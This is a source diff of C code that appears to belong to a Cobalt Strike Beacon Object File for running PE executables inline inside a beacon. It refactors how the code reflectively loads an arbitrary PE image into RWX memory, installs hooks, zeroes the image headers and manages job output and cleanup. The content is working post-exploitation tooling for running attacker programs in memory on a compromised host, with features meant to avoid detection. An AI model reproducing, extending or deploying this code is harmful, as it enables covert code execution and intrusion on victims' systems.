@@ -9,6 +9,7 @@ extern "C" {
 
 #include "ReflectiveLoaderEx.c"
 #include "globalshareddata.c"
+#include "simplelist1.c"
 
 // TODO: Add proxy dll loading https://github.com/kleiton0x00/Proxy-DLL-Loads
 _static HMODULE GetOrLoadDll(LPCSTR dllName) {
@@ -63,6 +64,9 @@ _static void ImportHookApis(HookContext *ctx) {
   ctx->_malloc                            = GetProcAddress2(msvcrt, "malloc");
   ctx->_realloc                           = GetProcAddress2(msvcrt, "realloc");
   ctx->_vsprintf_s                        = GetProcAddress2(msvcrt, "vsprintf_s");
+#ifdef _WIN64
+  ctx->_RtlDeleteFunctionTable            = GetProcAddress2(kernel32, "RtlDeleteFunctionTable");
+#endif
 #ifdef _DEBUG
   ctx->_OutputDebugStringA                = GetProcAddress2(kernel32, "OutputDebugStringA");
 #endif
@@ -81,29 +85,29 @@ _static void ImportHookApis(HookContext *ctx) {
   }
 }
 
-HookResult InlineExecutePE(HookFeatures features, bool isBackground,
-                           int runningTimeoutMs, void *stdin_, int stdinSize,
+HookResult InlineExecutePE(HookFeatures features, void *stdin_, int stdinSize,
                            void *peImage, int peImageSize, char *commandLineA,
-                           int commandLineASize, void **loadedImageBase,
-                           int jobVersion) {
+                           int commandLineASize, int jobVersion,
+                           HANDLE hCompletionEvent, void **loadedImageBase) {
   TRACEF("Begin run pe.");
 
   HookContext *hookCtx = NULL;
+  PVOID hookBase = NULL;
   HookControlEntryProc hookControlEntry = NULL;
   WCHAR *commandLineW = NULL;
   int commandLineWSize = 0;
+  int outputType = 0;
   JobEntry **jobList = NULL;
-  int jobId = -1;
+  int jobId = 0;
   HANDLE hJobWritePipe = NULL;
+  HookOutput *output = NULL;
   HookResult result = HookResultSuccess;
   DWORD imageSize = 0;
   PVOID imageBase = NULL;
   PVOID entryPoint = NULL;
   GlobalSharedData *sharedData = NULL;
   int index = 0;
-  int outputType = 0;
-  SimpleList *stdout_ = NULL;
-  SimpleList *stderr_ = NULL;
+  LoadedPEImage *loadedPEImage = NULL;
 
   // Check the architecture of the PE image
   if (((PIMAGE_NT_HEADERS)((PBYTE)peImage +
@@ -130,22 +134,23 @@ HookResult InlineExecutePE(HookFeatures features, bool isBackground,
   }
   _memset(hookCtx, 0, sizeof(HookContext));
   hookCtx->Features = features;
+  hookCtx->CompletionEventHandle = hCompletionEvent;
   ImportHookApis(hookCtx);
 #ifdef HOOKS_DLL
   hookControlEntry = (HookControlEntryProc)GetProcAddress2(
       GetOrLoadDll2("hooks.dll"), "__HookControlEntry");
 #else
-  hookControlEntry = (HookControlEntryProc)VirtualAlloc(
-      NULL, sizeof(HOOKS_EXE), MEM_RESERVE | MEM_COMMIT,
-      PAGE_EXECUTE_READWRITE);
+  hookBase = VirtualAlloc(NULL, sizeof(HOOKS_EXE), MEM_RESERVE | MEM_COMMIT,
+                          PAGE_EXECUTE_READWRITE);
   // TODO: allocate then set RWX, add padding before and after code.
-  if (!hookControlEntry) {
+  if (!hookBase) {
     PRINTF_ERR("Failed to allocate hooks code.");
     goto err;
   }
-  _memcpy((void *)hookControlEntry, HOOKS_EXE, sizeof(HOOKS_EXE));
+  _memcpy(hookBase, HOOKS_EXE, sizeof(HOOKS_EXE));
+  hookCtx->HookBase = hookBase;
+  hookControlEntry = (HookControlEntryProc)hookBase;
 #endif
-  hookCtx->HookControlEntry = (PVOID)hookControlEntry;
   if ((hookCtx->Features & HookFeatureCommandLine) && commandLineA) {
     commandLineWSize = commandLineASize * 2;
     commandLineW = (WCHAR *)malloc(commandLineWSize);
@@ -169,26 +174,38 @@ HookResult InlineExecutePE(HookFeatures features, bool isBackground,
 
   TRACEF("2. Initialize hook");
 
-  if (SimpleAddJob(jobVersion,
-                   (hookCtx->Features & HookFeatureCpp) ? CALLBACK_OUTPUT
-                                                        : CALLBACK_OUTPUT_UTF8,
-                   commandLineA, &jobList, &jobId, &hJobWritePipe))
-    PRINTF("Job %d was added. Never use 'jobkill' or 'inline-log-pe' for this "
-           "PE image!",
-           jobId);
+  outputType =
+      (features & HookFeatureCpp) ? CALLBACK_OUTPUT : CALLBACK_OUTPUT_UTF8;
+  if (jobVersion) {
+    if (SimpleAddJob(jobVersion, outputType, commandLineA, &jobList, &jobId,
+                     &hJobWritePipe)) {
+      hookCtx->JobOutputWriteHandle = hJobWritePipe;
+      hookCtx->JobOutputLock = 0;
+      PRINTF("Job %d was added. Never use 'jobkill' for this PE image!", jobId);
+    } else
+      PRINTF_ERR("Failed to add job. Fall back to normal async log. Use "
+                 "'inline-log-pe' to fetch logs manually.");
+  }
+
+  output = (HookOutput *)malloc(sizeof(HookOutput));
+  if (!output) {
+    PRINTF_ERR("Failed to allocate hook output.");
+    goto err;
+  }
+  _memset(output, 0, sizeof(HookOutput));
+  if (!SimpleListAlloc(&output->Logs, sizeof(LogEntry) * 64)) {
+    PRINTF_ERR("Failed to allocate hook log list.");
+    goto err;
+  }
+  output->Type = outputType;
+  hookCtx->Output = output;
 
   result = hookControlEntry(HookControlCreate, hookCtx, stdin_, stdinSize,
                             commandLineA, commandLineASize, commandLineW,
-                            commandLineWSize, hJobWritePipe);
+                            commandLineWSize);
   switch (result) {
   case HookResultSuccess:
     break;
-  case HookResultErrorCreateLogs:
-    PRINTF_ERR("Failed to create hook log queue.");
-    goto err;
-  case HookResultErrorCreateProcessExitedEvent:
-    PRINTF_ERR("Failed to create process exited event.");
-    goto err;
   case HookResultErrorCreateCommandLine:
     PRINTF_ERR("Failed to allocate command-line.");
     goto err;
@@ -230,9 +247,14 @@ HookResult InlineExecutePE(HookFeatures features, bool isBackground,
       &imageBase, (PVOID)LoadLibraryA, hookCtx->MyGetProcAddress,
       (PVOID)VirtualAlloc, (PVOID)NtFlushInstructionCache,
       hookCtx->Features & HookFeatureCppSEH);
+  hookCtx->ImageBase = imageBase;
   TRACEF("ReflectiveLoaderEx done.");
   if (hookCtx->Features & HookFeatureCppSEH) {
-    EnableSEH(imageBase);
+#ifdef _WIN64
+    hookCtx->FunctionTable = EnableSEH(imageBase);
+#else
+    hookCtx->SEH_ImageBase = EnableSEH(imageBase);
+#endif
     TRACEF("SEH was enabled.");
     // Zero PE headers
     _memset(peImage, 0,
@@ -240,10 +262,30 @@ HookResult InlineExecutePE(HookFeatures features, bool isBackground,
                                  ((PIMAGE_DOS_HEADER)peImage)->e_lfanew))
                 ->OptionalHeader.SizeOfHeaders);
   }
-  if (loadedImageBase)
-    *loadedImageBase = imageBase;
   PRINTF("PE image was loaded. (imageBase: %p, imageSize: %x, entryPoint: %p)",
          imageBase, (UINT)imageSize, entryPoint);
+  sharedData = GetGlobalSharedData();
+  for (index = 0; index < LoadedPEImageMax; index++) {
+    if (!sharedData->PEImages[index].ImageBase)
+      break;
+  }
+  if (index == LoadedPEImageMax) {
+    PRINTF_ERR("Too many loaded PE images. Can't add to PEImages.");
+    goto err;
+  }
+  loadedPEImage = sharedData->PEImages + index;
+  loadedPEImage->ImageBase = imageBase;
+  loadedPEImage->HookContext = hookCtx;
+  loadedPEImage->IsRunning = FALSE;
+  loadedPEImage->JobList = jobList;
+  loadedPEImage->JobId = jobId;
+  loadedPEImage->Output = output;
+  sharedData->LastImageBase = imageBase;
+  hookCtx->PEImage = loadedPEImage;
+  if (loadedImageBase)
+    *loadedImageBase = imageBase;
+  TRACEF("PE image %p was added to global shared data index %d.", imageBase,
+         index);
 
   /*
    * 4. Call exe entrypoint
@@ -263,135 +305,31 @@ HookResult InlineExecutePE(HookFeatures features, bool isBackground,
                result);
     goto err;
   }
+  loadedPEImage->IsRunning = TRUE;
   TRACEF("Thread of exe entry-point was created.");
-  sharedData = GetGlobalSharedData();
-  for (index = 0; index < LoadedPEImageMax; index++) {
-    if (!sharedData->PEImages[index].ImageBase)
-      break;
-  }
-  if (index == LoadedPEImageMax) {
-    PRINTF_ERR("Too many loaded PE images. Can't add to PEImages.");
-    goto out;
-  }
-  sharedData->PEImages[index].ImageBase = imageBase;
-  sharedData->PEImages[index].HookContext = hookCtx;
-  sharedData->PEImages[index].IsRunning = TRUE;
-  sharedData->PEImages[index].JobList = jobList;
-  sharedData->PEImages[index].JobId = jobId;
-  sharedData->LastImageBase = imageBase;
-  TRACEF("PE Image %p was added to global shared data index %d.", imageBase,
-         index);
-  // We must use background mode when the PE image was added to the job list.
-  // Otherwise, the log in the hooks will lost due to the job will be removed
-  // before return.
-  if (isBackground || jobList) {
-    PRINTF("Skip waiting and run PE in the background.");
-    goto out;
-  }
-
-  /*
-   * 5. Wait for the entry point complete
-   */
-
-  TRACEF("5. Wait for the entry point complete");
-
-  result = hookControlEntry(HookControlStop, runningTimeoutMs);
-  // DO NOT goto err if failed since here. We don't know if PE image really ran
-  // competed.
-  switch (result) {
-  case HookResultSuccess:
-    break;
-  case HookResultErrorStopWaitTimeout:
-    PRINTF_ERR("Timeout waiting for exe entry-point to finish running.");
-    goto out;
-  case HookResultErrorStopWaitLastThread:
-    PRINTF_ERR("Failed to wait for the last thread to exit.");
-    goto out;
-  default:
-    PRINTF_ERR("Failed to call HookControlEntry(HookControlStop): %x", result);
-    goto out;
-  }
-  TRACEF("WaitForSingleObject(ProcessExitedEvent) returns.");
-
-  /*
-   * 6. Print async log (excluding stdout/stderr)
-   */
-
-  TRACEF("6. Print async log (excluding stdout/stderr)");
-
-  if (!jobList) {
-    SpinLock(hookCtx->LogLock, {
-      SimpleListForEach(&hookCtx->Logs, LogEntry, log, {
-        if (log->Text) {
-          _BeaconPrint(log->Type, xorstr_("%.*s"), log->Size, log->Text);
-          free(log->Text);
-          log->Text = NULL;
-          // TODO: Trim list?
-        }
-      });
-    });
-  }
-
-  /*
-   * 7. Print stdout/stderr
-   */
-
-  TRACEF("7. Print stdout/stderr");
-
-  if (hookCtx->Features & HookFeatureRedirectStdio) {
-    outputType = (hookCtx->Features & HookFeatureCpp) ? CALLBACK_OUTPUT
-                                                      : CALLBACK_OUTPUT_UTF8;
-    stdout_ = &hookCtx->StdoutPipe.Buffer;
-    _BeaconPrint(outputType, xorstr_("Stdout: %.*s"), stdout_->Size,
-                 (char *)stdout_->Buffer);
-    stderr_ = &hookCtx->StderrPipe.Buffer;
-    _BeaconPrint(outputType, xorstr_("Stderr: %.*s"), stderr_->Size,
-                 (char *)stderr_->Buffer);
-  }
-
-  /*
-   * 8. Free hook and PE image
-   */
-
-  TRACEF("8. Free hook and PE image");
-
-  hookControlEntry(HookControlDelete);
-  if (hookCtx->Features & HookFeatureUnload) {
-    if (hookCtx->Features & HookFeatureCppSEH) {
-      DisableSEH(imageBase);
-      TRACEF("SEH was disabled.");
-    }
-    VirtualFree(imageBase, 0, MEM_RELEASE);
-    TRACEF("The entire PE image was unloaded.");
-    if (jobList) {
-      SimpleRemoveJob(jobList, jobId);
-      TRACEF("Job %d was removed.", jobId);
-    }
-#ifndef HOOKS_DLL
-    VirtualFree((PVOID)hookControlEntry, 0, MEM_RELEASE);
-    TRACEF("The hook code was unloaded.");
-#endif
-    free(hookCtx);
-    TRACEF("The hook context was free.");
-    sharedData->PEImages[index].ImageBase = NULL;
-    sharedData->PEImages[index].HookContext = NULL;
-    sharedData->PEImages[index].IsRunning = FALSE;
-    sharedData->PEImages[index].JobList = NULL;
-    sharedData->PEImages[index].JobId = 0;
-    TRACEF("PE Image %p was removed from global shared data index %d.",
-           imageBase, index);
-  }
-  PRINTF("The exe run completed.");
   goto out;
 
 err:
-  if (imageBase)
+  if (imageBase) {
+    if (hookCtx->Features & HookFeatureCppSEH) {
+#ifdef _WIN64
+      RtlDeleteFunctionTable((PRUNTIME_FUNCTION)hookCtx->FunctionTable);
+#else
+      *(PVOID *)hookCtx->SEH_ImageBase = NULL;
+#endif
+    }
     VirtualFree(imageBase, 0, MEM_RELEASE);
+  }
+  if (output) {
+    SimpleListForEach(&output->Logs, LogEntry, log, free(log->Text));
+    SimpleListFree(&output->Logs);
+    free(output);
+  }
   if (jobList)
     SimpleRemoveJob(jobList, jobId);
 #ifndef HOOKS_DLL
-  if (hookControlEntry)
-    VirtualFree((PVOID)hookControlEntry, 0, MEM_RELEASE);
+  if (hookBase)
+    VirtualFree(hookBase, 0, MEM_RELEASE);
 #endif
   if (hookCtx)
     free(hookCtx);
@@ -410,8 +348,6 @@ void go(char *argv, int argc) {
   datap parser;
   BeaconDataParse(&parser, argv, argc);
   HookFeatures features = (HookFeatures)BeaconDataInt(&parser);
-  bool isBackground = !!(BOOL)BeaconDataInt(&parser);
-  int runningTimeoutMs = BeaconDataInt(&parser);
   int stdinSize = 0;
   void *stdin_ = BeaconDataExtract(&parser, &stdinSize);
   int peImageSize = 0;
@@ -419,16 +355,13 @@ void go(char *argv, int argc) {
   int commandLineASize = 0;
   char *commandLineA = BeaconDataExtract(&parser, &commandLineASize);
   int jobVersion = BeaconDataInt(&parser);
-  TRACEF("Arguments was parsed. (features: %x, isBackground: %d, "
-         "runningTimeoutMs: %d, stdin_: %p, stdinSize: %d, peImage: %p, "
-         "peImageSize: %d, commandLineA: %s, jobVersion: %d)",
-         features, isBackground, runningTimeoutMs, stdin_, stdinSize, peImage,
-         peImageSize, commandLineA, jobVersion);
+  TRACEF("Arguments was parsed. (features: %x, stdin: %p (%d bytes), peImage: "
+         "%p (%d bytes), commandLineA: %s (%d bytes), jobVersion: %d)",
+         features, stdin_, stdinSize, peImage, peImageSize, commandLineA,
+         commandLineASize, jobVersion);
 
-  void *loadedImageBase = NULL;
-  InlineExecutePE(features, isBackground, runningTimeoutMs, stdin_, stdinSize,
-                  peImage, peImageSize, commandLineA, commandLineASize,
-                  &loadedImageBase, jobVersion);
+  InlineExecutePE(features, stdin_, stdinSize, peImage, peImageSize,
+                  commandLineA, commandLineASize, jobVersion, NULL, NULL);
 }
 #endif
 }
